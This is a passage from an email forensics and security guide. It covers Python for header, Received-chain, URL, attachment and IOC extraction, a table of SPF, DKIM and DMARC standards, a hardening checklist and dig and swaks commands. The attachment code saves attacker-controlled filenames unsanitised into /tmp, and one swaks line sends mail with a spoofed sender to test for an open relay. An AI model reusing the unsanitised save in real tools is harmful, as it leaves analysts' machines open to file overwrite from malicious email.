    print(f"From:     {decode_hdr(msg.get('From'))}")
    print(f"To:       {decode_hdr(msg.get('To'))}")
    print(f"Subject:  {decode_hdr(msg.get('Subject'))}")
    print(f"Date:     {msg.get('Date')}")
    print(f"Reply-To: {msg.get('Reply-To')}")
    print(f"Return-Path: {msg.get('Return-Path')}")
    print(f"Message-ID: {msg.get('Message-ID')}")
    print(f"Auth-Results: {msg.get('Authentication-Results')}")

    # Extract full Received chain
    received_chain = msg.get_all('Received', [])
    print("\n--- Received Chain (bottom to top = actual path) ---")
    for i, hop in enumerate(reversed(received_chain)):
        print(f"Hop {i+1}: {hop.strip()[:200]}")

    # Extract URLs from body
    urls = []
    for part in msg.walk():
        ctype = part.get_content_type()
        if ctype in ('text/plain', 'text/html'):
            try:
                body = part.get_payload(decode=True).decode('utf-8', errors='replace')
                found = re.findall(r'https?://[^\s\'"<>]+', body)
                urls.extend(found)
            except Exception:
                pass

    print(f"\n--- URLs found ({len(urls)}) ---")
    for url in set(urls):
        print(f"  {url}")

    # Extract attachments
    print("\n--- Attachments ---")
    for part in msg.walk():
        filename = part.get_filename()
        if filename:
            decoded_name = decode_hdr(filename)
            content_type = part.get_content_type()
            payload = part.get_payload(decode=True)
            size = len(payload) if payload else 0
            print(f"  File: {decoded_name} | Type: {content_type} | Size: {size} bytes")
            # Save attachment
            with open(f"/tmp/{decoded_name}", 'wb') as f:
                f.write(payload)
            print(f"  Saved to /tmp/{decoded_name}")

analyze_email('suspicious.eml')
```

### Timestamp Analysis

Each `Received:` header includes a timestamp; compare to detect:
- **Unusual delays**: email held for hours before delivery (possible spam retry)
- **Backdated timestamps**: sender's clock misconfigured or spoofed
- **Geographic inconsistency**: timestamp timezone vs. claimed origin location

```python
from email.utils import parsedate_to_datetime

def extract_timestamps(msg):
    received = msg.get_all('Received', [])
    for hop in received:
        # Timestamp is typically after semicolon
        if ';' in hop:
            ts_str = hop.split(';')[-1].strip()
            try:
                dt = parsedate_to_datetime(ts_str)
                print(f"  {dt.isoformat()} | {hop[:80].strip()}")
            except Exception as e:
                print(f"  Parse error: {e} | {ts_str}")
```

### Email Forensics in Autopsy

- Import `.eml`, `.msg`, `.pst`, `.ost` files
- Timeline analysis: map email timestamps to activity timeline
- Attachment extraction: automatic extraction + hash matching against NSRL/VT
- Keyword search across email subjects, bodies, headers
- Link analysis: visualize email sender/receiver relationships

### IOC Extraction from Emails

```python
import re, hashlib

def extract_iocs(eml_path):
    with open(eml_path, 'rb') as f:
        raw = f.read()

    content = raw.decode('utf-8', errors='replace')

    # IPv4 addresses
    ips = re.findall(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b', content)

    # Domains (from URLs)
    domains = re.findall(r'https?://([a-zA-Z0-9\-\.]+)/', content)

    # Email addresses
    emails = re.findall(r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}', content)

    # Hashes (MD5, SHA256)
    md5s = re.findall(r'\b[0-9a-fA-F]{32}\b', content)
    sha256s = re.findall(r'\b[0-9a-fA-F]{64}\b', content)

    # File hash of email itself
    email_sha256 = hashlib.sha256(raw).hexdigest()

    return {
        'email_sha256': email_sha256,
        'ips': list(set(ips)),
        'domains': list(set(domains)),
        'emails': list(set(emails)),
        'md5s': list(set(md5s)),
        'sha256s': list(set(sha256s))
    }
```

---

## Email Security Standards Quick Reference

| Standard | Purpose | DNS Record Location | Required Action |
|---------|---------|-------------------|----------------|
| SPF | Authorize sending IPs | `domain.com TXT` | Add TXT record listing mail servers |
| DKIM | Cryptographically sign emails | `selector._domainkey.domain.com TXT` | Generate keypair, configure MTA, publish public key |
| DMARC | Policy enforcement + reporting | `_dmarc.domain.com TXT` | Add TXT record, start with `p=none`, progress to `p=reject` |
| MTA-STS | Enforce TLS for inbound SMTP | `_mta-sts.domain.com TXT` + HTTPS file | Host policy file, add DNS TXT |
| DANE | Pin TLS cert via DNS | `_25._tcp.mail.domain.com TLSA` | Enable DNSSEC, publish TLSA record |
| BIMI | Display brand logo in inbox | `default._bimi.domain.com TXT` | Requires DMARC p=reject + VMC certificate |
| ARC | Preserve auth across forwarding | Added by intermediary MTAs | Implement in MTA (Postfix: OpenARC milter) |
| TLS-RPT | Report STARTTLS/MTA-STS failures | `_smtp._tls.domain.com TXT` | Add TXT with reporting address |

---

## Email Security Deployment Checklist

```
DNS Authentication:
[ ] SPF record published and covers all sending sources
[ ] SPF lookup count ≤ 10
[ ] DKIM keys generated (RSA-2048 or Ed25519) and published
[ ] DKIM signing configured on all outbound mail paths
[ ] DMARC record published with rua= for aggregate reports
[ ] DMARC at p=reject for primary domain
[ ] Subdomain policy (sp=) set appropriately
[ ] MTA-STS policy published in enforce mode

Transport Security:
[ ] TLS 1.2+ enforced for SMTP; TLS 1.0/1.1 disabled
[ ] Weak ciphers (RC4, 3DES, NULL) disabled
[ ] STARTTLS enabled on port 587 (submission)
[ ] DANE/TLSA records published (if DNSSEC deployed)

Mail Server Hardening:
[ ] VRFY and EXPN commands disabled
[ ] Open relay test passed (reject external-to-external)
[ ] SMTP AUTH disabled on port 25
[ ] Rate limiting on SMTP AUTH and inbound connections
[ ] Valid PTR (rDNS) record for sending IP
[ ] Sending IP not on major block lists (MXToolbox blacklist check)

Gateway / Cloud Security:
[ ] Anti-phishing policy with impersonation protection enabled
[ ] Safe Attachments / attachment sandboxing enabled
[ ] Safe Links / URL rewriting + time-of-click checking enabled
[ ] BEC detection: monitor inbox rule creation and forwarding
[ ] DMARC aggregate reports reviewed weekly
[ ] Phishing simulation program in place for user awareness
```

---

## Reference Commands Quick-Access

```bash
# Check SPF
dig TXT domain.com | grep spf

# Check DKIM
dig TXT selector1._domainkey.domain.com

# Check DMARC
dig TXT _dmarc.domain.com

# Check MTA-STS DNS
dig TXT _mta-sts.domain.com

# Check BIMI
dig TXT default._bimi.domain.com

# Test SMTP open relay
swaks --to external@gmail.com --from spoof@domain.com --server mail.domain.com

# Parse DMARC reports
parsedmarc aggregate_report.xml.gz

# Analyze email headers
emlAnalyzer -i suspicious.eml --header --urls --attachments

# Generate DKIM keypair
openssl genrsa -out dkim_private.pem 2048
openssl rsa -in dkim_private.pem -pubout -out dkim_public.pem

# Test DKIM signing
opendkim-testkey -d domain.com -s selector1 -vvv
```
